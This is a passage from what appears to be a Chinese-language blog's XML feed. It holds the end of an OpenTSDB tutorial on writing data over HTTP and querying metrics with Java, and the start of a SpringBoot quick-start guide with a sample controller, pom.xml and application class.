<strong>数据处理和存储</strong></h2><p>OpenTSDB接收到JSON格式的数据后，会解析并根据数据中的时间戳、指标、值以及标签信息将数据存储到适当的位置。OpenTSDB利用其基于HBase的存储引擎来有效地存储和管理时间序列数据。</p><h2 id="3-5-HTTP写入"><a href="#3-5-HTTP写入" class="headerlink" title="3.5 HTTP写入"></a>3.5 HTTP写入</h2><p>使用HTTP的POST请求将JSON数据发送到OpenTSDB的API端点是一种常见的方式，用于将时间序列数据导入到OpenTSDB数据库中。这种方法允许用户通过HTTP协议向OpenTSDB发送数据，并指定数据的指标、时间戳、值以及标签信息。</p><h3 id="步骤概述："><a href="#步骤概述：" class="headerlink" title="步骤概述："></a>步骤概述：</h3><ol><li><strong>构造JSON数据：</strong> 首先，需要构造符合OpenTSDB预期格式的JSON数据。这包括指定指标（metric）、时间戳（timestamp）、值（value），以及标签（tags）等信息。</li><li><strong>发送HTTP POST请求：</strong> 使用任何支持HTTP POST请求的编程语言或工具，将构造好的JSON数据发送到OpenTSDB的API端点。</li><li><strong>处理响应（可选）：</strong> 如果需要，可以处理来自OpenTSDB API的响应，以验证数据是否成功导入或执行其他操作。</li></ol><h3 id="详细步骤："><a href="#详细步骤：" class="headerlink" title="详细步骤："></a>详细步骤：</h3><h4 id="构造JSON数据："><a href="#构造JSON数据：" class="headerlink" title="构造JSON数据："></a>构造JSON数据：</h4><p>构造一个符合OpenTSDB要求的JSON数据对象，确保包含必要的字段如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">jsonCopy code</span><br><span class="line">&#123;</span><br><span class="line">    &quot;metric&quot;: &quot;your_metric_name&quot;,</span><br><span class="line">    &quot;timestamp&quot;: your_timestamp,</span><br><span class="line">    &quot;value&quot;: your_value,</span><br><span class="line">    &quot;tags&quot;: &#123;</span><br><span class="line">        &quot;tag1&quot;: &quot;value1&quot;,</span><br><span class="line">        &quot;tag2&quot;: &quot;value2&quot;,</span><br><span class="line">        // 可选的其他标签</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><strong>“metric”</strong>: 指标名称，表示要存储的时间序列数据类型。</li><li><strong>“timestamp”</strong>: 时间戳，表示数据点的时间。</li><li><strong>“value”</strong>: 数据点的值。</li><li><strong>“tags”</strong>: 附加标签，以键值对的形式提供更多信息。</li></ul><h4 id="发起HTTP请求："><a href="#发起HTTP请求：" class="headerlink" title="发起HTTP请求："></a>发起HTTP请求：</h4><p>当使用Java开发来将JSON数据发送到OpenTSDB的API端点时，可以使用Java的HTTP客户端库，比如Apache HttpClient 或者 Java原生的 <strong>HttpURLConnection</strong> 类。以下是使用Java原生 <strong>HttpURLConnection</strong> 的示例代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.HttpURLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OpenTSDBDataSender</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 构造JSON数据</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;metric\&quot;:\&quot;temperature\&quot;,\&quot;timestamp\&quot;:1637016000,\&quot;value\&quot;:25.5,\&quot;tags\&quot;:&#123;\&quot;sensor_id\&quot;:\&quot;12345\&quot;,\&quot;location\&quot;:\&quot;room_1\&quot;&#125;&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置OpenTSDB的API端点URL</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">opentsdbURL</span> <span class="operator">=</span> <span class="string">&quot;http://your_opentsdb_instance/api/put&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">HttpURLConnection</span> <span class="variable">connection</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 创建URL对象</span></span><br><span class="line">            <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(opentsdbURL);</span><br><span class="line">            <span class="comment">// 打开连接</span></span><br><span class="line">            connection = (HttpURLConnection) url.openConnection();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 设置请求方法为POST</span></span><br><span class="line">            connection.setRequestMethod(<span class="string">&quot;POST&quot;</span>);</span><br><span class="line">            <span class="comment">// 设置请求头部信息</span></span><br><span class="line">            connection.setRequestProperty(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/json&quot;</span>);</span><br><span class="line">            connection.setRequestProperty(<span class="string">&quot;Accept&quot;</span>, <span class="string">&quot;application/json&quot;</span>);</span><br><span class="line">            connection.setDoOutput(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取连接的输出流</span></span><br><span class="line">            <span class="keyword">try</span> (<span class="type">OutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> connection.getOutputStream()) &#123;</span><br><span class="line">                <span class="type">byte</span>[] input = json.getBytes(StandardCharsets.UTF_8);</span><br><span class="line">                <span class="comment">// 将JSON数据写入输出流</span></span><br><span class="line">                outputStream.write(input);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取响应码</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">responseCode</span> <span class="operator">=</span> connection.getResponseCode();</span><br><span class="line">            <span class="keyword">if</span> (responseCode == HttpURLConnection.HTTP_OK) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;Data successfully sent to OpenTSDB.&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;Failed to send data. Status code: &quot;</span> + responseCode);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="comment">// 在finally块中关闭连接</span></span><br><span class="line">            <span class="keyword">if</span> (connection != <span class="literal">null</span>) &#123;</span><br><span class="line">                connection.disconnect();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 <strong>HttpURLConnection</strong> 类建立HTTP连接，并将JSON数据通过POST请求发送到OpenTSDB的API端点。在实际使用中，需要替换 <strong>opentsdbURL</strong> 为你OpenTSDB实例的API端点URL，并根据需要修改JSON数据内容。</p><h1 id="四：数据的查询"><a href="#四：数据的查询" class="headerlink" title="四：数据的查询"></a>四：数据的查询</h1><h2 id="4-1-聚合函数查询"><a href="#4-1-聚合函数查询" class="headerlink" title="4.1 聚合函数查询"></a>4.1 聚合函数查询</h2><p>若你想获取某段时间的某个 metric（指标）的数据，可以使用 OpenTSDB 提供的查询 API。OpenTSDB 提供了强大的查询功能，允许你执行各种类型的查询来获取时间序列数据。通常情况下，你可以使用类似于以下形式的查询来检索所需的数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plaintextCopy code</span><br><span class="line">http://your_opentsdb_instance/api/query?start=&lt;start_timestamp&gt;&amp;end=&lt;end_timestamp&gt;&amp;m=&lt;aggregation_function&gt;:&lt;metric_name&gt;&#123;&lt;tag_key&gt;=&lt;tag_value&gt;&#125;</span><br></pre></td></tr></table></figure><p>解释一下这个查询 URL 的各个部分：</p><ul><li><strong>your_opentsdb_instance</strong>: OpenTSDB 实例的 URL。</li><li><strong>start&#x3D;<start_timestamp></start_timestamp></strong> 和 <strong>end&#x3D;<end_timestamp></end_timestamp></strong>: 表示查询的时间范围，使用时间戳表示起始时间和结束时间。</li><li><strong>m&#x3D;<aggregation_function>:<metric_name>{<tag_key>&#x3D;<tag_value>}</tag_value></tag_key></metric_name></aggregation_function></strong>: 这部分指定了要查询的指标（metric）。**<aggregation_function>** 表示聚合函数（如 sum、avg、max、min 等），**<metric_name>** 是指标的名称，**{<tag_key>&#x3D;<tag_value>}** 可以用于指定查询的标签条件。</tag_value></tag_key></metric_name></aggregation_function></li></ul><p>以下是一个示例查询：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plaintextCopy code</span><br><span class="line">http://your_opentsdb_instance/api/query?start=1637010000&amp;end=1637020000&amp;m=sum:temperature&#123;location=room_1&#125;</span><br></pre></td></tr></table></figure><p>这个示例查询将在时间戳范围 1637010000 到 1637020000 内，对名称为 <strong>temperature</strong>，标签 <strong>location&#x3D;room_1</strong> 的数据执行求和（sum）的操作。你可以根据需要修改时间范围、指标名称、聚合函数以及标签条件来执行不同的查询操作。</p><p>通过构建类似的查询 URL，并通过 HTTP GET 请求发送到 OpenTSDB 实例的 API 端点，就可以获取所需时间段内的特定 metric 数据。获取到的数据会以 JSON 或其他格式的形式返回，你可以根据返回的数据格式来进一步处理或展示这些数据。</p><h2 id="4-2-全部数据查询"><a href="#4-2-全部数据查询" class="headerlink" title="4.2 全部数据查询"></a>4.2 全部数据查询</h2><p>若你想获取某个时间段内某个指标（metric）的全部数据，可以进行一个简单的查询，而无需指定具体的聚合函数。你可以将查询参数设置为请求该时间段内的所有数据点。以下是一个示例查询：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plaintextCopy code</span><br><span class="line">http://your_opentsdb_instance/api/query?start=&lt;start_timestamp&gt;&amp;end=&lt;end_timestamp&gt;&amp;m=&lt;metric_name&gt;</span><br></pre></td></tr></table></figure><p>解释这个查询 URL 的各个部分：</p><ul><li><strong>your_opentsdb_instance</strong>: OpenTSDB 实例的 URL。</li><li><strong>start&#x3D;<start_timestamp></start_timestamp></strong> 和 <strong>end&#x3D;<end_timestamp></end_timestamp></strong>: 表示查询的时间范围，使用时间戳表示起始时间和结束时间。</li><li><strong>m&#x3D;<metric_name></metric_name></strong>: 这部分指定了要查询的指标（metric）。**<metric_name>** 是指标的名称，而没有指定聚合函数。</metric_name></li></ul><p>以下是一个示例查询：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plaintextCopy code</span><br><span class="line">http://your_opentsdb_instance/api/query?start=1637010000&amp;end=1637020000&amp;m=temperature</span><br></pre></td></tr></table></figure><p>这个示例查询将在时间戳范围 1637010000 到 1637020000 内获取名为 <strong>temperature</strong> 的全部数据。由于没有指定聚合函数，OpenTSDB将返回在该时间范围内的所有数据点，每个数据点对应一个时间戳的值。</p><p>通过构建类似的查询 URL，并通过 HTTP GET 请求发送到 OpenTSDB 实例的 API 端点，就可以获取所需时间段内特定指标的全部数据。根据返回的数据格式，你可以进一步处理或者分析这些数据。</p><p>当使用 Java 来执行一个获取某个时间段内全部数据的查询时，你可以使用类似以下的代码来构建 HTTP GET 请求并发送到 OpenTSDB 的 API 端点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">javaCopy code</span><br><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line">import java.net.HttpURLConnection;</span><br><span class="line">import java.net.URL;</span><br><span class="line">import java.nio.charset.StandardCharsets;</span><br><span class="line"></span><br><span class="line">public class OpenTSDBDataRetriever &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        // 设置时间范围和指标名称</span><br><span class="line">        long startTime = 1637010000; // 起始时间戳</span><br><span class="line">        long endTime = 1637020000; // 结束时间戳</span><br><span class="line">        String metric = &quot;temperature&quot;; // 指标名称</span><br><span class="line"></span><br><span class="line">        // 设置OpenTSDB的API端点URL</span><br><span class="line">        String opentsdbURL = &quot;http://your_opentsdb_instance/api/query&quot;;</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            // 构建查询URL</span><br><span class="line">            String queryURL = opentsdbURL + &quot;?start=&quot; + startTime + &quot;&amp;end=&quot; + endTime + &quot;&amp;m=&quot; + metric;</span><br><span class="line"></span><br><span class="line">            // 创建URL对象</span><br><span class="line">            URL url = new URL(queryURL);</span><br><span class="line">            // 打开连接</span><br><span class="line">            HttpURLConnection connection = (HttpURLConnection) url.openConnection();</span><br><span class="line"></span><br><span class="line">            // 设置请求方法为GET</span><br><span class="line">            connection.setRequestMethod(&quot;GET&quot;);</span><br><span class="line">            connection.setRequestProperty(&quot;Accept&quot;, &quot;application/json&quot;);</span><br><span class="line"></span><br><span class="line">            // 获取响应</span><br><span class="line">            BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream(), StandardCharsets.UTF_8));</span><br><span class="line">            String inputLine;</span><br><span class="line">            StringBuilder response = new StringBuilder();</span><br><span class="line"></span><br><span class="line">            while ((inputLine = in.readLine()) != null) &#123;</span><br><span class="line">                response.append(inputLine);</span><br><span class="line">            &#125;</span><br><span class="line">            in.close();</span><br><span class="line"></span><br><span class="line">            // 打印查询结果</span><br><span class="line">            System.out.println(&quot;Query Result:&quot;);</span><br><span class="line">            System.out.println(response.toString());</span><br><span class="line"></span><br><span class="line">            // 关闭连接</span><br><span class="line">            connection.disconnect();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>请将 <strong>your_opentsdb_instance</strong> 替换为你的 OpenTSDB 实例的 URL。该代码使用 <strong>HttpURLConnection</strong> 建立 HTTP 连接，构建了一个包含起始时间、结束时间和指标名称的查询 URL。随后，发送 GET 请求到 OpenTSDB 的 API 端点。收到响应后，将查询结果打印输出。根据实际需要，你可以根据返回的数据格式进一步处理或分析这些数据。</p>]]></content>
      
      
      <categories>
          
          <category> 大数据 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 常用组件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SpringBoot 快速上手</title>
      <link href="/blog/e2b59d56.html/"/>
      <url>/blog/e2b59d56.html/</url>
      
        <content type="html"><![CDATA[<h1 id="SpringBoot入门程序开发"><a href="#SpringBoot入门程序开发" class="headerlink" title="SpringBoot入门程序开发"></a>SpringBoot入门程序开发</h1><h2 id="Springboot-初衷"><a href="#Springboot-初衷" class="headerlink" title="Springboot 初衷"></a>Springboot 初衷</h2><p>SpringBoot是由Pivotal团队提供的全新框架，其设计目的是用来简化Spring应用的初始搭建以及开发过程。</p><ul><li>SpringBoot程序优点<ul><li>起步依赖（简化依赖配置）</li><li>自动配置（简化常用工程相关配置）</li><li>辅助功能（内置服务器，……）</li></ul></li></ul><h2 id="创建-SpringBoot-工程的四种方式"><a href="#创建-SpringBoot-工程的四种方式" class="headerlink" title="创建 SpringBoot 工程的四种方式"></a>创建 SpringBoot 工程的四种方式</h2><ul><li>基于Idea创建SpringBoot工程</li><li>基于官网创建SpringBoot工程</li><li>基于阿里云创建SpringBoot工程</li><li>手工创建Maven工程修改为SpringBoot工程</li></ul><h3 id="基于Idea创建SpringBoot工程"><a href="#基于Idea创建SpringBoot工程" class="headerlink" title="基于Idea创建SpringBoot工程"></a>基于Idea创建SpringBoot工程</h3><h4 id="①：创建新模块，选择Spring-Initializr，并配置模块相关基础信息"><a href="#①：创建新模块，选择Spring-Initializr，并配置模块相关基础信息" class="headerlink" title="①：创建新模块，选择Spring Initializr，并配置模块相关基础信息"></a>①：创建新模块，选择Spring Initializr，并配置模块相关基础信息</h4><p><img src="/blog/e2b59d56.html/image-20230524001822755.png" alt="image-20230524001822755"></p><h4 id="②：选择当前模块需要使用的技术集"><a href="#②：选择当前模块需要使用的技术集" class="headerlink" title="②：选择当前模块需要使用的技术集"></a>②：选择当前模块需要使用的技术集</h4><p><img src="/blog/e2b59d56.html/image-20230524001512848.png" alt="image-20230524001512848"></p><h4 id="③：开发控制器类"><a href="#③：开发控制器类" class="headerlink" title="③：开发控制器类"></a>③：开发控制器类</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.aiyingke.demo.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: Rupert Tears</span></span><br><span class="line"><span class="comment"> * Date: Created in 0:24 2023/5/24</span></span><br><span class="line"><span class="comment"> * Description: Thought is already is late, exactly is the earliest time.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/demo&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DemoController</span> &#123;</span><br><span class="line">    <span class="meta">@GetMapping</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;DemoController is running...&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="④：运行自动生成的Application类"><a href="#④：运行自动生成的Application类" class="headerlink" title="④：运行自动生成的Application类"></a>④：运行自动生成的Application类</h4><p><img src="/blog/e2b59d56.html/image-20230524003521612.png" alt="image-20230524003521612"></p><h4 id="最简SpringBoot程序所包含的基础文件"><a href="#最简SpringBoot程序所包含的基础文件" class="headerlink" title="最简SpringBoot程序所包含的基础文件"></a>最简SpringBoot程序所包含的基础文件</h4><ul><li>pom.xml文件</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">relativePath</span>/&gt;</span> <span class="comment">&lt;!-- lookup parent from repository --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>cn.aiyingke<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>springboot-base-create-method-01<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>springboot-base-create-method-01<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>springboot-base-create-method-01<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">java.version</span>&gt;</span>17<span class="tag">&lt;/<span class="name">java.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>Application类</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.aiyingke;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpringbootBaseCreateMethod01Application</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(SpringbootBaseCreateMethod01Application.class, args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h4><ol><li>开发SpringBoot程序可以根据向导进行联网快速制作</li><li>SpringBoot程序需要基于JDK进行制作</li><li>SpringBoot程序中需要使用何种功能通过勾选选择技术</li><li>运行SpringBoot程序通过运行Application程序入口进行</li></ol><h3 id="基于官网创建SpringBoot工程"><a href="#基于官网创建SpringBoot工程" class="headerlink" title="基于官网创建SpringBoot工程"></a>基于官网创建SpringBoot工程</h3><p>基于SpringBoot官网创建项目，地址：<a href="https://start.spring.io/">https://start.spring.io/</a></p><p><img src="/blog/e2b59d56.html/image-20230524004616611.png" alt="image-20230524004616611"></p><ol><li>打开SpringBoot官网，选择Quickstart Your Project</li><li>创建工程，并保存项目</li><li>解压项目，通过IDE导入项目</li></ol><h3 id="基于阿里云创建SpringBoot工程"><a href="#基于阿里云创建SpringBoot工程" class="headerlink" title="基于阿里云创建SpringBoot工程"></a>基于阿里云创建SpringBoot工程</h3><p>基于阿里云创建项目，地址：<a href="https://start.aliyun.com/">https://start.aliyun.com</a></p><h4 id="注意事项"><a href="#注意事项" class="headerlink" 